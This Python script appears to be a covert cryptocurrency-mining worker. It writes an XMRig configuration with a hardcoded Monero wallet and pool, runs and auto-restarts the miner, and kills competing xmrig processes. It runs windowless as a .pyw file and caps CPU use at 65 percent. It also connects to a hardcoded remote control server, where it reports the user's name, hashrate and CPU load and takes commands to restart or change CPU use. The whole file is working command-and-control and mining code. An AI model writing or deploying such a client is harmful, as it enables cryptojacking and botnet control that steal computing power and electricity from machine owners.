# File: WORKER_CONTROL_65.pyw
# 65% CPU + Auto Restart + Farm Control Client
# ASCII only - fixed hash parser

import os
import json
import getpass
import subprocess
import platform
import time
import psutil
import socket
import threading
import sys
import re

# ============================================================
# CONTROL SERVER CONFIG
# ============================================================

SERVER_IP = "160.191.237.196"
SERVER_PORT = 8386
WORKER = getpass.getuser().lower()

# ============================================================
# XMRIG SETUP
# ============================================================

dir_path = os.path.dirname(__file__)
config_path = os.path.join(dir_path, "config.json")
xmrig_exe = os.path.join(dir_path, "xmrig.exe")

print("[WORKER] Starting worker:", WORKER)
print("[WORKER] CPU 65 percent + Auto restart + Control client")
print("=======================================================")

threads = os.cpu_count() or 4
cpu_name = platform.processor().lower()

cpu_percent_target = 65
use_threads = max(1, int(threads * cpu_percent_target / 100.0))
rx_list = list(range(use_threads))

if threads <= 4:
    rx_mode = "light"
elif threads <= 8:
    rx_mode = "medium"
else:
    rx_mode = "fast"

print("[WORKER] CPU:", cpu_name)
print("[WORKER] Total threads:", threads, "| Using:", use_threads)

config = {
    "autosave": True,
    "background": False,
    "colors": True,

    "randomx": {
        "1gb-pages": False,
        "mode": rx_mode,
        "numa": True
    },

    "cpu": {
        "enabled": True,
        "huge-pages": False,
        "huge-pages-jit": False,
        "hw-aes": True,
        "priority": 3,
        "yield": True,
        "memory-pool": False,
        "max-threads-hint": 100,
        "rx": rx_list
    },

    "pools": [{
        "algo": "rx/0",
        "url": "gulf.moneroocean.stream:443",
        "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGpYPkUbB7t2qaKr4g",
        "pass": "x",
        "rig-id": WORKER,
        "tls": True,
        "keepalive": True
    }],

    "donate-level": 0,
    "print-time": 10
}

with open(config_path, "w") as f:
    json.dump(config, f, indent=4)

print("[WORKER] Config saved OK")
print("=======================================================")

# ============================================================
# XMRIG START + AUTO RESTART
# ============================================================

def kill_xmrig():
    for proc in psutil.process_iter():
        try:
            if "xmrig" in proc.name().lower():
                proc.kill()
        except:
            pass

def start_xmrig():
    return subprocess.Popen(
        [xmrig_exe],
        cwd=dir_path,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

def check_output(line):
    if "H/s" in line or "speed" in line or "accepted" in line:
        return True
    return False


# ============================================================
# FIXED HASH PARSER - COMPATIBLE WITH ALL XMRIG VERSIONS
# ============================================================

def parse_hash(line):
    line = line.strip()

    # remove ANSI colors if present
    line = re.sub(r'\x1b[^m]*m', '', line)

    # match: 123.4 H/s, 1.2K H/s, 0.5M H/s
    m = re.search(r'(\d+\.?\d*)\s*(K|M)?\s*H/s', line)
    if not m:
        return None

    val = float(m.group(1))
    unit = m.group(2)

    if unit == "K":
        val *= 1000
    elif unit == "M":
        val *= 1000000

    return val


miner = start_xmrig()
last_ok = time.time()
last_hash = 0.0

# ============================================================
# CONTROL CLIENT SOCKET
# ============================================================

def connect_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[CONTROL] Connected to server")
            return s
        except:
            print("[CONTROL] Connect failed, retry in 5s")
            time.sleep(5)

sock = connect_server()
sock.sendall(f"HELLO|{WORKER}\n".encode())

# ============================================================
# CPU ADJUST (NO RESTART)
# ============================================================

def apply_cpu_limit(percent):
    global cpu_percent_target, use_threads, rx_list, miner

    cpu_percent_target = max(1, min(int(percent), 100))
    use_threads = max(1, int(threads * cpu_percent_target / 100.0))
    rx_list = list(range(use_threads))

    print("[CONTROL] CPU set to", cpu_percent_target, "%")

    try:
        with open(config_path, "r") as f:
            cfg = json.load(f)
        cfg["cpu"]["rx"] = rx_list
        with open(config_path, "w") as f:
            json.dump(cfg, f, indent=4)
    except:
        print("[CONTROL] config update failed")

    try:
        if miner and miner.stdin:
            miner.stdin.write(f"threads {use_threads}\n")
            miner.stdin.flush()
            print("[CONTROL] xmrig threads updated")
    except:
        print("[CONTROL] failed to update xmrig threads")

# ============================================================
# CONTROL LISTENER
# ============================================================

def control_listener():
    global sock
    while True:
        try:
            data = sock.recv(1024).decode(errors="ignore")
            if not data:
                raise Exception("disconnect")

            for line in data.splitlines():
                line = line.strip()
                if line == "":
                    continue

                if line.startswith("CMD|RESTART"):
                    print("[CONTROL] Restart command received")
                    kill_xmrig()
                    time.sleep(1)
                    os.execl(sys.executable, sys.executable, *sys.argv)

                elif line.startswith("CMD|SETCPU|"):
                    p = int(line.split("|")[2])
                    apply_cpu_limit(p)

        except:
            print("[CONTROL] Lost connection, reconnecting...")
            time.sleep(3)
            sock = connect_server()
            sock.sendall(f"HELLO|{WORKER}\n".encode())

# ============================================================
# SEND STATUS LOOP
# ============================================================

def control_sender():
    global last_hash, sock
    while True:
        try:
            cpu = psutil.cpu_percent(interval=1)
            msg = f"STATUS|{WORKER}|{last_hash}|{cpu}\n"
            sock.sendall(msg.encode())
        except:
            pass
        time.sleep(5)

threading.Thread(target=control_listener, daemon=True).start()
threading.Thread(target=control_sender, daemon=True).start()

# ============================================================
# MAIN LOOP - READ XMRIG OUTPUT
# ============================================================

while True:
    try:
        line = miner.stdout.readline()

        if line:
            line = line.strip()
            print(line)

            if check_output(line):
                last_ok = time.time()

            h = parse_hash(line)
            if h is not None:
                last_hash = h

        if time.time() - last_ok > 30:
            print("[WORKER] Miner stuck, restarting...")
            kill_xmrig()
            time.sleep(2)
            miner = start_xmrig()
            last_ok = time.time()

        if miner.poll() is not None:
            print("[WORKER] Miner crashed, restarting...")
            kill_xmrig()
            time.sleep(2)
            miner = start_xmrig()
            last_ok = time.time()

    except Exception as e:
        print("[ERROR]:", str(e))
        kill_xmrig()
        time.sleep(2)
        miner = start_xmrig()
        last_ok = time.time()
